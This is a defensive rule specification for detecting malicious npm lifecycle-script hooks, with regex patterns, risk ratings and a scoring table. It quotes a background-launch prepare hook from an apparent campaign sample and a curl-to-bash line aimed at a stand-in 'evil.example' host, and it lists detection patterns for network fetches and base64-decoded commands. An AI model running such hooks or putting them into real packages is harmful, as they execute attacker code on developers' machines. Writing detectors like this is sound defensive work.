---
detector: lifecycle-scripts
applies-to: package.json, package-lock.json, yarn.lock, pnpm-lock.yaml
risk-family: install-time-execution
---

# Detector: lifecycle scripts

npm lifecycle hooks (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, `prepack`) run arbitrary shell commands during `npm install`. They are the **single most-abused attack vector** in npm supply chain attacks.

## Rules

### LS-001 — background server launch in lifecycle hook
**Risk:** 🔴 CRITICAL
**Matches:** Any lifecycle script that launches a long-running process in the background.

Regex patterns (match against the string value of any `scripts.{preinstall,install,postinstall,prepare,prepublish,prepack}`):
```
\bnohup\b
\bdisown\b
&\s*$                    # trailing & for background
\bstart\s+/b\b           # Windows start /b
\bsetsid\b
\b(daemonize|daemon-run)\b
```

**Why suspicious:** lifecycle hooks should install dependencies, compile native modules, or emit warnings — never launch daemons. Legitimate dev servers are started via explicit scripts (`npm start`, `npm run dev`), not install hooks.

**Real-world example:** Contagious Interview sample 001 (April 2026) — `"prepare": "start /b node server || nohup node server &"`. The prepare hook silently launched `server.js` in the background during `npm install`. See [`../samples/contagious-interview-001/`](../samples/contagious-interview-001/).

**False positives:** none known. Legitimate packages don't do this.

---

### LS-002 — mixed Windows/Unix command syntax
**Risk:** 🔴 CRITICAL
**Matches:** Lifecycle scripts that concatenate Windows `cmd` syntax with POSIX shell syntax.

Patterns:
```
start\s+/b\s+.*\|\|\s*nohup
cmd\s+/c.*\|\|\s*.*;
powershell.*\|\|\s*bash
```

**Why suspicious:** cross-platform attackers use `||` fallback chains so the same lifecycle script works on Windows and macOS/Linux. Legitimate cross-platform install logic uses dedicated tools (`cross-env`, `rimraf`, `shx`) or separate `os-specific` scripts.

**Real-world example:** Contagious Interview sample 001.

**False positives:** none known.

---

### LS-003 — lifecycle hook runs node against non-build file
**Risk:** 🔴 CRITICAL
**Matches:** `preinstall`/`install`/`postinstall`/`prepare` scripts that run `node <file>` where `<file>` is anything other than standard build tooling.

Allowlist of acceptable targets:
- `node node_modules/.bin/*` (running a dep's own CLI)
- `node build.js`, `node build/index.js`, `node scripts/build.js` (explicit build scripts)
- `node -e '...'` limited to trivial commands (`console.log`, `process.exit`)
- Native module builders: `node-gyp`, `node-pre-gyp`, `prebuild-install`

Flag everything else, especially:
```
node\s+\./?server(\.js)?       # node server / node ./server
node\s+\./?index(\.js)?        # node index — should be 'start', not 'install'
node\s+\./?app(\.js)?
node\s+loader(\.js)?
node\s+config(\.js)?
```

**Why suspicious:** install hooks exist for build tooling, not for running the application itself. A `prepare` hook that starts a server is either misconfigured (run `npm run dev`) or malicious (silent background exfil).

**Real-world example:** Contagious Interview sample 001 — `"prepare": "start /b node server || nohup node server &"`.

**False positives:** some dev tooling (`nodemon`, `pm2`) might run node in a postinstall for demo scaffolding. Check if the referenced file is part of the dep itself (`node_modules/...`) vs. the project root.

---

### LS-004 — lifecycle hook with network call
**Risk:** 🔴 CRITICAL
**Matches:** Scripts invoking `curl`, `wget`, `fetch`, `axios`, `node -e 'fetch(...)'`, or piping from a network source.

Patterns:
```
\b(curl|wget)\b.*\|
curl\s.*-[a-zA-Z]*s?L?\s+https?://
wget\s.*https?://
node\s+-e\s+['"].*fetch\(
\beval\(.*curl
\.\s*\|\s*bash
```

**Why suspicious:** no legitimate install script fetches code from the internet beyond the npm registry. Native module installers that download binaries should use `prebuild-install` or `node-gyp`, which are well-known and don't need curl/wget.

**Real-world example:** countless commodity stealers. A classic pattern is `"postinstall": "curl -sL https://evil.example/install.sh | bash"`.

**False positives:** some legacy packages fetch prebuilt binaries via curl (rare). Check if the URL domain is a known binary host (nodejs.org, github.com releases, cdn.mongodb.com).

---

### LS-005 — base64 or hex-encoded commands in lifecycle hook
**Risk:** 🔴 CRITICAL
**Matches:** Scripts that decode base64/hex and pipe to a shell.

Patterns:
```
base64\s+-d
echo\s+['"]?[A-Za-z0-9+/]{40,}=?=?['"]?\s*\|\s*base64
printf.*\\x[0-9a-f]
node\s+-e\s+['"].*Buffer\.from\(['"][A-Za-z0-9+/]{40,}
```

**Why suspicious:** lifecycle scripts don't need obfuscation. If a legitimate package wanted to run a complex command, it would put it in a `scripts/*.js` file. Base64 in a lifecycle hook is always hiding something.

**False positives:** none known.

---

### LS-006 — lifecycle hook reads env vars
**Risk:** 🟠 HIGH
**Matches:** Scripts that reference environment variables in the shell string (`$HOME`, `$PATH`, `${X}`).

Patterns:
```
\$HOME\b
\$USER\b
\$PATH\b
\$\{[A-Z_]+\}
```

**Why suspicious:** reading env in install scripts is a step toward exfil. Legitimate scripts use env vars for paths, but combined with other signals this adds weight.

**False positives:** many — this alone isn't a blocker. Used as a contributing signal.

---

### LS-007 — lifecycle hook shells out to dynamic strings
**Risk:** 🟠 HIGH
**Matches:** `sh -c`, `bash -c`, `eval` in lifecycle hooks where the argument is not a literal string.

Patterns:
```
sh\s+-c\s+['"]?\$
bash\s+-c\s+['"]?\$
eval\s+\$
```

**Why suspicious:** dynamic shell invocation is a step toward deobfuscated execution.

**False positives:** rare. Most legitimate scripts use literal commands.

---

### LS-008 — install hook in a package that isn't the project root
**Risk:** 🟠 HIGH (context-dependent)
**Matches:** A `package.json` in a subdirectory (`client/package.json`, `server/package.json`) with its own aggressive lifecycle hooks, especially when the root `package.json` already runs `npm install --prefix` into it.

**Why suspicious:** multi-package repos with nested install hooks are a known technique to hide payload execution in the subdirectory install, bypassing the reader who only looks at the root `package.json`.

**Real-world example:** some variants of the Contagious Interview campaign hide the malicious hook in `client/package.json` while the root looks clean.

**False positives:** monorepos (lerna, nx, turbo, pnpm workspaces) legitimately have nested package.json files. Check if the root is a workspace declaration.

---

### LS-009 — `prepublish` vs `prepublishOnly`
**Risk:** 🟡 MEDIUM
**Matches:** A `prepublish` script (not `prepublishOnly`) that does anything beyond trivial actions.

**Why suspicious:** `prepublish` runs on `npm install` in npm < 5 (now deprecated but still honored in some tooling). `prepublishOnly` runs ONLY on `npm publish`. Using the deprecated `prepublish` is either sloppy or deliberately taking advantage of the legacy behavior.

**False positives:** old projects that haven't migrated. Weight low unless combined with other signals.

---

### LS-010 — unusually long lifecycle script
**Risk:** 🟡 MEDIUM
**Matches:** A lifecycle script string longer than 200 characters.

**Why suspicious:** legitimate scripts are short (`rimraf dist && tsc`). Long scripts often chain multiple commands to hide intent in the middle.

**False positives:** complex build pipelines. Often legitimate in monorepos.

---

### LS-011 — `bin` field points to a non-build script with execution
**Risk:** 🟡 MEDIUM
**Matches:** `package.json` has a `bin` field mapping to a file that contains `require('child_process')`, `fetch`, or `process.env` exfil patterns.

**Why suspicious:** when a package is installed globally or via `npx`, the `bin` entry executes. Malicious packages use `bin` as a backup execution path if lifecycle hooks fail.

**False positives:** CLI tools legitimately use child_process. Check if the CLI is the package's stated purpose.

---

## Scoring summary

| Rule | Weight |
|---|---|
| LS-001 background launch | +40 |
| LS-002 mixed OS syntax | +40 |
| LS-003 node against non-build file | +40 |
| LS-004 network call in hook | +50 |
| LS-005 base64 in hook | +50 |
| LS-006 env var read | +5 |
| LS-007 dynamic shell invocation | +20 |
| LS-008 nested hook | +15 |
| LS-009 legacy prepublish | +5 |
| LS-010 long script | +5 |
| LS-011 suspicious bin entry | +10 |

A single LS-001 through LS-005 hit should BLOCK the repo on its own.
